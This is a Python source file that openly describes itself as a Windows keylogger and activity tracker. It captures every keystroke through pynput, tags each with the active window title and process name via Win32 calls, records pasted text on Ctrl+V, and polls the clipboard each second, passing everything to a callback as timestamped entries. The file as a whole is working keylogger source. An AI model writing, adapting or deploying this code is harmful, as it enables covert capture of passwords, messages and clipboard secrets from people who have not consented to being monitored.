"""Keylogger and activity tracker for Windows."""
from __future__ import annotations

import ctypes
import logging
import os
import platform
import queue
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Callable, Set

logger = logging.getLogger(__name__)


@dataclass
class ActivityEntry:
    """Single activity entry with timestamp and context."""
    timestamp: str
    application: str
    window_title: str
    input_text: str
    entry_type: str = "keystroke"  # keystroke, clipboard

    def to_dict(self) -> dict:
        return {
            "timestamp": self.timestamp,
            "application": self.application,
            "window_title": self.window_title,
            "input_text": self.input_text,
            "entry_type": self.entry_type,
        }


@dataclass
class InputBuffer:
    """Buffer for collecting input from same window."""
    application: str = ""
    window_title: str = ""
    text: str = ""
    last_updated: float = field(default_factory=time.time)
    started_at: str = ""


class WindowInfo:
    """Get active window information on Windows."""

    def __init__(self):
        self._is_windows = platform.system() == "Windows"
        self._user32 = None
        self._psapi = None
        self._kernel32 = None
        if self._is_windows:
            try:
                self._user32 = ctypes.windll.user32
                self._psapi = ctypes.windll.psapi
                self._kernel32 = ctypes.windll.kernel32
            except Exception as e:
                logger.debug("Failed to load Windows DLLs: %s", e)

    def get_active_window_info(self) -> tuple[str, str]:
        """Get application name and window title of active window.
        
        Returns:
            Tuple of (application_name, window_title)
        """
        if not self._is_windows or not self._user32:
            return ("Unknown", "Unknown")

        try:
            hwnd = self._user32.GetForegroundWindow()
            if not hwnd:
                return ("Unknown", "Unknown")

            # Get window title
            length = self._user32.GetWindowTextLengthW(hwnd) + 1
            buffer = ctypes.create_unicode_buffer(length)
            self._user32.GetWindowTextW(hwnd, buffer, length)
            window_title = buffer.value or "Untitled"

            # Get process ID
            pid = ctypes.c_ulong()
            self._user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))

            # Get process name
            app_name = self._get_process_name(pid.value)

            return (app_name, window_title)
        except Exception as e:
            logger.debug("Failed to get window info: %s", e)
            return ("Unknown", "Unknown")

    def _get_process_name(self, pid: int) -> str:
        """Get process name from PID."""
        if not self._kernel32:
            return "Unknown"

        try:
            PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
            handle = self._kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
            if not handle:
                return "Unknown"

            try:
                buffer = ctypes.create_unicode_buffer(1024)
                size = ctypes.c_ulong(1024)
                
                # Try QueryFullProcessImageNameW
                if hasattr(self._kernel32, "QueryFullProcessImageNameW"):
                    result = self._kernel32.QueryFullProcessImageNameW(
                        handle, 0, buffer, ctypes.byref(size)
                    )
                    if result:
                        path = buffer.value
                        return os.path.basename(path) if path else "Unknown"

                # Fallback: try GetModuleFileNameExW
                if self._psapi:
                    result = self._psapi.GetModuleFileNameExW(handle, None, buffer, 1024)
                    if result:
                        path = buffer.value
                        return os.path.basename(path) if path else "Unknown"

                return "Unknown"
            finally:
                self._kernel32.CloseHandle(handle)
        except Exception as e:
            logger.debug("Failed to get process name: %s", e)
            return "Unknown"


class ActivityTracker:
    """Track keyboard input and clipboard with application context."""

    SPECIAL_KEYS = {
        "space": " ",
        "enter": "[ENTER]\n",
        "tab": "[TAB]",
        "backspace": "[BACKSPACE]",
        "delete": "[DELETE]",
        "escape": "[ESC]",
        "caps_lock": "[CAPS]",
        "shift": "",  # Modifiers ignored alone
        "ctrl_l": "",
        "ctrl_r": "",
        "ctrl": "",
        "alt_l": "",
        "alt_r": "",
        "alt_gr": "",
        "cmd": "",
        "cmd_l": "",
        "cmd_r": "",
        "shift_l": "",
        "shift_r": "",
        "up": "[UP]",
        "down": "[DOWN]",
        "left": "[LEFT]",
        "right": "[RIGHT]",
        "home": "[HOME]",
        "end": "[END]",
        "page_up": "[PGUP]",
        "page_down": "[PGDN]",
        "insert": "[INS]",
        "print_screen": "[PRTSC]",
        "scroll_lock": "[SCRLK]",
        "pause": "[PAUSE]",
        "num_lock": "[NUMLK]",
        "f1": "[F1]",
        "f2": "[F2]",
        "f3": "[F3]",
        "f4": "[F4]",
        "f5": "[F5]",
        "f6": "[F6]",
        "f7": "[F7]",
        "f8": "[F8]",
        "f9": "[F9]",
        "f10": "[F10]",
        "f11": "[F11]",
        "f12": "[F12]",
    }

    def __init__(
        self,
        on_activity: Callable[[ActivityEntry], None] | None = None,
        buffer_timeout: float = 3.0,
    ):
        """Initialize activity tracker.
        
        Args:
            on_activity: Callback when activity entry is ready
            buffer_timeout: Seconds of inactivity before flushing buffer
        """
        self._on_activity = on_activity
        self._buffer_timeout = buffer_timeout
        self._window_info = WindowInfo()
        self._buffer = InputBuffer()
        self._buffer_lock = threading.Lock()
        self._activity_queue: queue.Queue[ActivityEntry] = queue.Queue()
        self._listener = None
        self._clipboard_thread: threading.Thread | None = None
        self._flush_thread: threading.Thread | None = None
        self._running = False
        self._last_clipboard = ""
        self._clipboard_check_interval = 1.0
        # Track pressed modifier keys
        self._pressed_modifiers: Set[str] = set()
        self._ctrl_pressed = False

    def start(self) -> None:
        """Start tracking keyboard and clipboard."""
        if self._running:
            return

        self._running = True
        logger.info("Starting activity tracker")

        # Start keyboard listener
        if platform.system() == "Windows":
            try:
                from pynput import keyboard as pynput_keyboard

                self._listener = pynput_keyboard.Listener(
                    on_press=self._on_key_press,
                    on_release=self._on_key_release,
                )
                self._listener.start()
                logger.info("Keyboard listener started")
            except ImportError:
                logger.warning("pynput not available, keyboard tracking disabled")
            except Exception as e:
                logger.warning("Failed to start keyboard listener: %s", e)

        # Start clipboard monitor
        self._clipboard_thread = threading.Thread(
            target=self._clipboard_monitor, daemon=True
        )
        self._clipboard_thread.start()

        # Start buffer flush thread
        self._flush_thread = threading.Thread(
            target=self._flush_monitor, daemon=True
        )
        self._flush_thread.start()

    def stop(self) -> None:
        """Stop tracking."""
        self._running = False
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass
        self._flush_buffer(force=True)
        logger.info("Activity tracker stopped")

    def get_pending_entries(self) -> list[ActivityEntry]:
        """Get all pending activity entries."""
        entries = []
        while True:
            try:
                entry = self._activity_queue.get_nowait()
                entries.append(entry)
            except queue.Empty:
                break
        return entries

    def _on_key_press(self, key) -> None:
        """Handle key press event."""
        try:
            key_name = None
            key_char = None
            
            if hasattr(key, "name") and key.name:
                key_name = key.name.lower()
            if hasattr(key, "char") and key.char:
                key_char = key.char
            
            # Track Ctrl key state
            if key_name in ("ctrl_l", "ctrl_r", "ctrl"):
                self._ctrl_pressed = True
                self._pressed_modifiers.add("ctrl")
                return
            
            # Check for Ctrl+V (paste from clipboard)
            # '\x16' is the control character for Ctrl+V
            if self._ctrl_pressed:
                if key_char and (key_char.lower() == "v" or key_char == "\x16"):
                    self._handle_paste()
                    return
                # Ignore other Ctrl+key combinations for now
                if key_char:
                    return
            
            # Get key character
            if key_char:
                # Skip control characters except for recognized ones
                if ord(key_char) < 32 and key_char not in ('\t', '\n', '\r'):
                    return
                char = key_char
            elif key_name:
                char = self.SPECIAL_KEYS.get(key_name, f"[{key_name.upper()}]")
            else:
                char = ""

            if not char:
                return

            # Get active window info
            app_name, window_title = self._window_info.get_active_window_info()

            with self._buffer_lock:
                # Check if window changed
                if (
                    self._buffer.application != app_name
                    or self._buffer.window_title != window_title
                ):
                    self._flush_buffer_locked()
                    self._buffer.application = app_name
                    self._buffer.window_title = window_title
                    self._buffer.started_at = datetime.now(timezone.utc).isoformat()

                self._buffer.text += char
                self._buffer.last_updated = time.time()

        except Exception as e:
            logger.debug("Key press handling error: %s", e)

    def _on_key_release(self, key) -> None:
        """Handle key release event - track modifier releases."""
        try:
            if hasattr(key, "name") and key.name:
                key_name = key.name.lower()
                if key_name in ("ctrl_l", "ctrl_r", "ctrl"):
                    self._ctrl_pressed = False
                    self._pressed_modifiers.discard("ctrl")
        except Exception:
            pass
    
    def _handle_paste(self) -> None:
        """Handle paste operation (Ctrl+V) - record clipboard content as pasted text."""
        if platform.system() != "Windows":
            return
        
        try:
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            CF_UNICODETEXT = 13
            
            if not user32.OpenClipboard(None):
                return
            
            try:
                handle = user32.GetClipboardData(CF_UNICODETEXT)
                if handle:
                    kernel32.GlobalLock.restype = ctypes.c_wchar_p
                    data = kernel32.GlobalLock(handle)
                    if data:
                        pasted_text = str(data)
                        kernel32.GlobalUnlock(handle)
                        
                        if pasted_text:
                            # Record the pasted text as part of the input stream
                            app_name, window_title = self._window_info.get_active_window_info()
                            
                            with self._buffer_lock:
                                # Check if window changed
                                if (
                                    self._buffer.application != app_name
                                    or self._buffer.window_title != window_title
                                ):
                                    self._flush_buffer_locked()
                                    self._buffer.application = app_name
                                    self._buffer.window_title = window_title
                                    self._buffer.started_at = datetime.now(timezone.utc).isoformat()
                                
                                # Add pasted text with marker
                                self._buffer.text += f"[PASTE]{pasted_text}[/PASTE]"
                                self._buffer.last_updated = time.time()
            finally:
                user32.CloseClipboard()
        except Exception as e:
            logger.debug("Paste handling error: %s", e)

    def _flush_buffer(self, force: bool = False) -> None:
        """Flush input buffer to activity queue."""
        with self._buffer_lock:
            self._flush_buffer_locked(force)

    def _flush_buffer_locked(self, force: bool = False) -> None:
        """Flush buffer (must hold lock)."""
        if not self._buffer.text:
            return

        if not force and (time.time() - self._buffer.last_updated) < self._buffer_timeout:
            return

        entry = ActivityEntry(
            timestamp=self._buffer.started_at or datetime.now(timezone.utc).isoformat(),
            application=self._buffer.application or "Unknown",
            window_title=self._buffer.window_title or "Unknown",
            input_text=self._buffer.text,
            entry_type="keystroke",
        )

        self._activity_queue.put(entry)
        if self._on_activity:
            try:
                self._on_activity(entry)
            except Exception as e:
                logger.debug("Activity callback error: %s", e)

        # Reset buffer
        self._buffer = InputBuffer()

    def _flush_monitor(self) -> None:
        """Monitor and flush buffer periodically."""
        while self._running:
            time.sleep(1.0)
            with self._buffer_lock:
                if self._buffer.text:
                    elapsed = time.time() - self._buffer.last_updated
                    if elapsed >= self._buffer_timeout:
                        self._flush_buffer_locked(force=True)

    def _clipboard_monitor(self) -> None:
        """Monitor clipboard changes."""
        if platform.system() != "Windows":
            return

        try:
            import ctypes
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32

            CF_UNICODETEXT = 13

            while self._running:
                time.sleep(self._clipboard_check_interval)
                try:
                    if not user32.OpenClipboard(None):
                        continue
                    try:
                        handle = user32.GetClipboardData(CF_UNICODETEXT)
                        if handle:
                            kernel32.GlobalLock.restype = ctypes.c_wchar_p
                            data = kernel32.GlobalLock(handle)
                            if data:
                                text = str(data)
                                kernel32.GlobalUnlock(handle)
                                
                                if text and text != self._last_clipboard:
                                    self._last_clipboard = text
                                    self._record_clipboard(text)
                    finally:
                        user32.CloseClipboard()
                except Exception as e:
                    logger.debug("Clipboard read error: %s", e)
        except Exception as e:
            logger.warning("Clipboard monitoring failed: %s", e)

    def _record_clipboard(self, text: str) -> None:
        """Record clipboard content."""
        if not text or len(text) > 10000:  # Limit clipboard size
            return

        app_name, window_title = self._window_info.get_active_window_info()
        entry = ActivityEntry(
            timestamp=datetime.now(timezone.utc).isoformat(),
            application=app_name,
            window_title=window_title,
            input_text=f"[CLIPBOARD] {text}",
            entry_type="clipboard",
        )
        self._activity_queue.put(entry)
        if self._on_activity:
            try:
                self._on_activity(entry)
            except Exception as e:
                logger.debug("Activity callback error: %s", e)